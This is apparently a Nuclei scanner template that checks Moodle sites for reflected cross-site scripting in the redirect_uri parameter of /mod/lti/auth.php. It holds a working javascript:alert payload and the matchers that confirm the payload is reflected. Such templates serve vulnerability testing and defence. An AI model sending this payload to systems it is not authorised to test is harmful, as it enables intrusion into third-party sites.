id: moodle-xss
info:
  author: hackergautam
  description: XSS in moodle via redirect_uri parameter
  name: Moodle redirect_uri - Cross-Site Scripting
  reference:
  - https://twitter.com/JacksonHHax/status/1391367064154042377
  severity: medium
  tags: moodle,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{randstr}}'
    - <form action="javascript:alert
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert(''{{randstr}}'')'
